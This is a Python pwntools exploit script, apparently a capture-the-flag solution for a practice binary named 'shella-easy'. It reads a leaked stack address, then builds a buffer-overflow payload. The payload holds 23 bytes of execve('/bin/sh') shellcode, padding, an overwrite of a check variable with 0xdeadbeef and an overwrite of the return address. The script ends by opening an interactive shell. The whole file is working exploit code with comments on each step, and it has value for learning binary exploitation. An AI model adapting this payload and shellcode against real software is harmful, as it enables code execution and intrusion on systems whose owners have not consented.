#!/usr/bin/env python3
from pwn import *

# Set context for 32-bit
context.arch = 'i386'
context.log_level = 'info'

# Start the target process
target = process('./shella-easy')

# Optional: Attach GDB for debugging
# gdb.attach(target, gdbscript='b *main+127')

print("[*] Target started")

# ============================================
# STEP 1: Receive and parse the leaked address
# ============================================
leak = target.recvline()
print(f"[*] Received: {leak}")

# Parse the address from the format: "Yeah I'll have a 0xffffd020 with..."
leak = leak.decode()  # Convert bytes to string
leak = leak.split("0x")[1]  # Get everything after "0x"
leak = leak.split(" ")[0]   # Get just the hex address
shellcode_addr = int(leak, 16)  # Convert hex string to integer

print(f"[+] Leaked address: {hex(shellcode_addr)}")

# ============================================
# STEP 2: Build the exploit payload
# ============================================

# Shellcode: execve("/bin/sh", ["/bin/sh", NULL], NULL)
# Source: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print(f"[*] Shellcode length: {len(shellcode)} bytes")

payload = b""

# Part 1: Shellcode (23 bytes)
payload += shellcode

# Part 2: Padding to reach offset 0x40 (64 bytes total)
padding_length = 0x40 - len(shellcode)
payload += b"0" * padding_length

print(f"[*] Payload so far: {len(payload)} bytes")

# Part 3: Overwrite check variable with 0xdeadbeef (4 bytes)
payload += p32(0xdeadbeef)

print(f"[*] Added check bypass: {len(payload)} bytes")

# Part 4: Padding to reach return address (8 more bytes)
payload += b"1" * 8

print(f"[*] Payload before return address: {len(payload)} bytes")

# Part 5: Overwrite return address with leaked address (4 bytes)
payload += p32(shellcode_addr)

print(f"[+] Final payload length: {len(payload)} bytes")
print(f"[+] Return address overwritten with: {hex(shellcode_addr)}")

# ============================================
# STEP 3: Send the payload
# ============================================
target.sendline(payload)

print("[+] Payload sent!")
print("[*] Waiting for shell...")

# ============================================
# STEP 4: Interact with the shell
# ============================================
target.interactive()